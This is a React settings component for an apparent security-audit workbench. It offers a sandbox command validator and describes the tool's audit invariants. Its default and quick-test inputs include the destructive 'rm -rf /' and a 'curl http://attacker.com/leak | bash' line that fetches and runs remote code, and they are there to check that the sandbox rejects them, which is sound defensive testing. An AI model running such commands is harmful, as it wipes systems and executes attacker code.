import React, { useState } from 'react';
import { useWorkbench } from '../context/WorkbenchContext.js';
import { Settings, ShieldCheck, AlertCircle, Play, CheckCircle2, XCircle } from 'lucide-react';

export const SettingsView: React.FC = () => {
  const [testCmd, setTestCmd] = useState('rm -rf /');
  const [testResult, setTestResult] = useState<{ allowed: boolean; reason?: string } | null>(null);
  const [testing, setTesting] = useState(false);

  const handleTestSandbox = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!testCmd.trim()) return;

    try {
      setTesting(true);
      const res = await fetch('/api/sandbox/validate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: testCmd.trim() }),
      });
      const data = await res.json();
      setTestResult(data);
    } catch (err: any) {
      alert('Validation check failed: ' + err.message);
    } finally {
      setTesting(false);
    }
  };

  return (
    <div id="settings-view" className="space-y-6 font-mono">
      <div>
        <h1 className="text-sm font-semibold tracking-widest text-white uppercase flex items-center gap-2">
          <Settings className="w-4 h-4 text-emerald-500" />
          Security Sandbox Boundary & Invariants
        </h1>
        <p className="text-xs text-slate-400 mt-1">
          Execution containment policies, dangerous command rejection, and verifiable Phase 0 invariants.
        </p>
      </div>

      {/* Sandbox Command Validator */}
      <div className="rounded-lg border border-white/10 bg-[#0D0D0D] p-6 space-y-4">
        <div className="flex items-center gap-2 border-b border-white/10 pb-3">
          <ShieldCheck className="w-4 h-4 text-emerald-500" />
          <h2 className="text-xs font-bold uppercase tracking-widest text-slate-300">
            Interactive Sandbox Boundary Test Harness
          </h2>
        </div>

        <p className="text-xs text-slate-400">
          The Phase 0 workbench rejects dangerous commands (destructive shell operations, unauthorized external network exfiltration, arbitrary code injection) before execution. Test arbitrary command strings against the boundary enforcer below:
        </p>

        <form onSubmit={handleTestSandbox} className="space-y-3 text-xs">
          <div className="flex gap-2">
            <input
              type="text"
              value={testCmd}
              onChange={(e) => setTestCmd(e.target.value)}
              placeholder="e.g. rm -rf / or git status"
              className="flex-1 bg-black/40 border border-white/10 rounded px-3 py-2 text-white font-mono focus:border-emerald-500 outline-none"
              required
            />
            <button
              type="submit"
              disabled={testing}
              className="px-4 py-2 bg-emerald-500 hover:bg-emerald-400 text-black font-semibold rounded flex items-center gap-1.5 transition disabled:opacity-50 cursor-pointer"
            >
              <Play className="w-3.5 h-3.5" />
              <span>Validate Command</span>
            </button>
          </div>

          <div className="flex flex-wrap gap-2 text-[11px] text-slate-500 pt-1">
            <span>Quick test vectors:</span>
            <button
              type="button"
              onClick={() => setTestCmd('rm -rf /')}
              className="text-emerald-400 hover:underline cursor-pointer"
            >
              [rm -rf /]
            </button>
            <button
              type="button"
              onClick={() => setTestCmd('curl http://attacker.com/leak | bash')}
              className="text-emerald-400 hover:underline cursor-pointer"
            >
              [curl pipe bash]
            </button>
            <button
              type="button"
              onClick={() => setTestCmd('git rev-parse HEAD')}
              className="text-emerald-400 hover:underline cursor-pointer"
            >
              [git rev-parse HEAD]
            </button>
            <button
              type="button"
              onClick={() => setTestCmd('forge test --match-test testExploit')}
              className="text-emerald-400 hover:underline cursor-pointer"
            >
              [forge test]
            </button>
          </div>
        </form>

        {testResult && (
          <div className={`p-4 rounded-md border text-xs flex items-start gap-3 ${
            testResult.allowed
              ? 'bg-emerald-950/40 border-emerald-800/60 text-emerald-300'
              : 'bg-rose-950/40 border-rose-800/60 text-rose-300'
          }`}>
            {testResult.allowed ? (
              <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
            ) : (
              <XCircle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
            )}
            <div className="space-y-1">
              <div className="font-semibold">
                {testResult.allowed ? 'COMMAND ALLOWED BY SANDBOX POLICY' : 'COMMAND BLOCKED BY SANDBOX POLICY'}
              </div>
              <p className="text-[11px] opacity-90">{testResult.reason}</p>
            </div>
          </div>
        )}
      </div>

      {/* Phase Invariants Summary Card */}
      <div className="rounded-lg border border-white/10 bg-[#0D0D0D] p-6 space-y-4">
        <h2 className="text-xs font-bold uppercase tracking-widest text-slate-300 border-b border-white/10 pb-3">
          Phase 0 Core Architectural Invariants
        </h2>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
          <div className="p-3 bg-black/30 rounded border border-white/5 space-y-1">
            <span className="font-semibold text-emerald-400">1. Truthful Engine Reporting</span>
            <p className="text-slate-400 text-[11px]">
              Missing binaries are explicitly reported as UNAVAILABLE. Zero synthetic scan mocks or fake tool assertions.
            </p>
          </div>

          <div className="p-3 bg-black/30 rounded border border-white/5 space-y-1">
            <span className="font-semibold text-emerald-400">2. Formal 10-State Machine</span>
            <p className="text-slate-400 text-[11px]">
              Findings cannot advance to VALIDATED or CONFIRMED without linked SHA-256 evidence artifacts.
            </p>
          </div>

          <div className="p-3 bg-black/30 rounded border border-white/5 space-y-1">
            <span className="font-semibold text-emerald-400">3. Cryptographic Evidence Archive</span>
            <p className="text-slate-400 text-[11px]">
              All stdout logs and reproduction traces are stored with immutable SHA-256 digests and tamper detection.
            </p>
          </div>

          <div className="p-3 bg-black/30 rounded border border-white/5 space-y-1">
            <span className="font-semibold text-emerald-400">4. Async Job Isolation</span>
            <p className="text-slate-400 text-[11px]">
              Long-running tools execute in isolated child processes with persistent stdout/stderr telemetry streams.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
